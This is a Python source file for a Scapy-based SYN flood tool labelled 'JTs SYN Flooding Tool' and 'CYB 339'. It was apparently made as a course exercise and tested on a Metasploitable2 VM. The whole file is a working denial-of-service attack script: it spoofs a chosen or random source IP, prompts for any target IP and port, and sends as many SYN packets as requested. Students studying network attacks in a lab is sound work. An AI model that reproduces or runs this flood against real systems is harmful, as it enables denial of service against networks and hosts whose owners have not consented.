import FP
import ipaddress
import os
import sys
import time
from random import randint
from scapy.all import *

co = 0

def synFlood(co, c, src, tgt, dp):
	for sport in range(1024,65535):
		co += 1
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=sport, dport=dp)
		pkt = IPlayer / TCPlayer
		send(pkt)
		print('Sent Packet #' + str(co))
		if co == c:
			print(' ')
			print(' ')
			print('SYN FLood Complete!')
			print(' ')
			print('Number of Packets Sent Sucessfully: ' + str(co))
			print(' ')
			time.sleep(1)
			break
	restart()
	quit()

def validIP(tgt):
	while True:
		try:
			tgt = ipaddress.ip_address(tgt)
			print('[+] Valid IP Address!')
			print('---')
			break
		except ValueError:
			print('[+] Invalid IP Address: ' + str(tgt))
			print(' ')
			time.sleep(1)
			print('[!] Restarting Program...')
			print(' ')
			time.sleep(1)
			restart()
			quit()
		else:
			break

def restart():
	y = 'y'
	n = 'n'
	while True:
		try:
			res = input('Do you want to Restart or Quit the Program? [y - Restart, n - Quit]: ')
			if res == n:
				print(' ')
				print('[!] Shutting Down Program...')
				time.sleep(1)
				print('[!] Returning Home...')
				print('-----')
				print(' ')
				time.sleep(1)
				FP.cTool()
				quit()
			elif res == y:
				print(' ')
				print('[!] Restarting Program...')
				print('-----')
				print(' ')
				time.sleep(1)
				main()
			else:
				break
			
		except ValueError:
			print(' ')
			print('[!] Please Enter Valid Input!')
			restart()
		else:
			break

def main():
	print('*------------------------------------------*')
	print('*                                          *')
	print('*           JTs SYN Flooding Tool          *')
	print('*                 CYB 339                  *')
	print('*                                          *')
	print('*------------------------------------------*')
	time.sleep(1)
	print(' ')
	print('The target used in testing was a Metasploitable2 Linux VM!')
	print(' ')
	print('If this Tool does not stop on its own, Use Ctrl + Z')
	print(' ')
	print(' ')
	print('Setting Packet Count...')
	time.sleep(1)
	print(' ')
	print('Packet Count Set: ' + str(co))
	print(' ')
	print('----')
	time.sleep(1)
	print('Choose Source IP Address - This is for Spoofing: ')
	print('Press Enter or 0 for Random IP!')
	print(' ')
	src = input('Enter Source IP Address - <0.0.0.0>: ')
	while True:
		if src == '' or src == '0':
			print(' ')
			print('[+] Setting Random Sorce Address...')
			time.sleep(1)
			src = '.'.join([str(randint(1,254)) for x in range(4)])
			print(' ')
			print('[*] Random Source Address Set!')
			print('[*] Random Source Address: ' + str(src))
			break
		elif src == None:
			print(' ')
			print('[!] Please Specify Sorce Address!')
			print('---')
			time.sleep(1)
			print(' ')
			print('[!] Restarting Program...')
			print(' ')
			time.sleep(1)
			restart()
		else:
			break
	print(' ')
	print('----')
	print('Choose Target IP Address - Please Enter Valid Target IP: ')
	print(' ')
	tgt = input('Enter Target IP to Flood - <0.0.0.0>: ')
	while True:
		if tgt == '':
			print(' ')
			print('[!] Please Specify Target IP Address: ')
			print('---')
			time.sleep(1)
			print(' ')
			print('[!] Restarting Program...')
			time.sleep(1)
			restart()
		elif tgt == None:
			print(' ')
			print('[!] Please Enter Target IP Address: ')
			print('---')
			time.sleep(1)
			print(' ')
			print('[!] Restarting Program...')
			print(' ')
			time.sleep(1)
			restart()
		else:
			validIP(tgt)
			break
	
	print(' ')
	print('----')
	dp = int(input('Enter Destination Port - 513 Works Best: '))
	while True:
		if dp == ' ' or dp == '' or dp == None:
			print(' ')
			print('[!] Please Enter D-Port: ')
			print('---')
			time.sleep(1)
			print(' ')
			print('[!] Restarting Program...')
			print(' ')
			time.sleep(1)
			restart()
		else:
			break
	
	print(' ')
	print('----')
	c = int(input('Enter # of Packets to Send - <#>: '))
	while True:
		if c == ' ' or c == '' or c == None:
			print(' ')
			print('[!] Please Enter Valid Number! <#>')
			print('---')
			time.sleep(1)
			print(' ')
			print('[!] Restarting Program...')
			print(' ')
			time.sleep(1)
			restart()
		else:
			break
	
	synFlood(co, c, src, tgt, dp)
	
	quit()

if __name__ == '__main__':
	main()


